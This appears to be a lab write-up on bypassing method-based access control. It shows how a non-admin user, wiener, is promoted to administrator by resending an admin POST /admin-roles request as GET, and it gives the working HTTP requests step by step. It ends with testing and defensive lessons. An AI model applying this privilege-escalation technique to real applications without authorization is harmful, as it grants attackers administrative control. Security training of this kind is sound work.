# Method-Based Access Control Can Be Circumvented

## 🎯 Lab Objective

Exploit inconsistent access control based on the HTTP method to promote the non-admin user `wiener` to administrator.

---

## 🧠 Vulnerability

The application protects the admin role-changing functionality when accessed using the `POST` method.

However, the same functionality can be accessed using `GET` without applying the same authorization check.

This creates a **method-based access control vulnerability**.

---

## 🔍 Step 1 — Discover the Admin Request

Logged in as:

```text
administrator:admin
```

Visited the admin panel and promoted `carlos`.

The request was:

```http
POST /admin-roles HTTP/2

username=carlos&action=upgrade
```

This showed us how the application performs the role change.

---

## 🔍 Step 2 — Test With a Non-Admin User

Logged in as:

```text
wiener:peter
```

Copied Wiener's session cookie into the request.

Sent:

```http
POST /admin-roles HTTP/2

username=carlos&action=upgrade
```

Response:

```text
401 Unauthorized
```

This confirmed that Wiener normally cannot perform the admin action.

---

## 🔍 Step 3 — Test HTTP Method Handling

Changed:

```text
POST
```

to:

```text
POSTX
```

The response changed to a missing-parameter error.

This indicated that the server was handling the request differently depending on the HTTP method.

---

## 🔍 Step 4 — Change POST to GET

Used Burp Suite:

```text
Right-click request
→ Change request method
```

Burp converted the request to:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
```

The request body was removed and the parameters were moved into the URL.

---

## 🔍 Step 5 — Target Wiener

Changed:

```text
username=carlos
```

to:

```text
username=wiener
```

Final request:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <LAB-ID>
Cookie: session=<WIENER-SESSION>
```

The request succeeded.

Wiener was promoted to administrator.

---

## 💥 Why Did It Work?

The application applied authorization differently depending on the HTTP method.

### POST

```text
Wiener
   ↓
POST /admin-roles
   ↓
Authorization check
   ↓
❌ Unauthorized
```

### GET

```text
Wiener
   ↓
GET /admin-roles
   ↓
Flawed/missing authorization check
   ↓
✅ Role changed
```

The vulnerability was **not Burp Suite**.

Burp only allowed us to modify the HTTP request.

The actual vulnerability was that the application failed to enforce the same authorization controls for the `GET` method.

---

## 🛠️ Burp Suite Technique

Important Burp feature:

```text
Right-click
→ Change request method
```

This automatically converts parameters between the request body and URL when changing the HTTP method.

---

## 🎯 Key Lesson

When testing access control, don't test only one HTTP method.

For sensitive endpoints, test whether authorization is consistently enforced across:

```text
GET
POST
PUT
PATCH
DELETE
```

Ask:

> "Can I perform the same privileged action using a different HTTP method?"

---

## 🧠 SOC / Pentesting Takeaway

A secure application should enforce authorization **server-side and consistently**, regardless of whether the request uses `GET`, `POST`, or another HTTP method.

### One-line memory note:

> **Always test different HTTP methods because access control may be correctly implemented for one method but missing or flawed for another.**

---

## ✅ Lab Status

* [x] Identified admin role-change request
* [x] Tested with non-admin session
* [x] Confirmed `POST` was protected
* [x] Tested method manipulation
* [x] Changed `POST` → `GET`
* [x] Changed target from `carlos` → `wiener`
* [x] Promoted Wiener to administrator
* [x] Lab solved
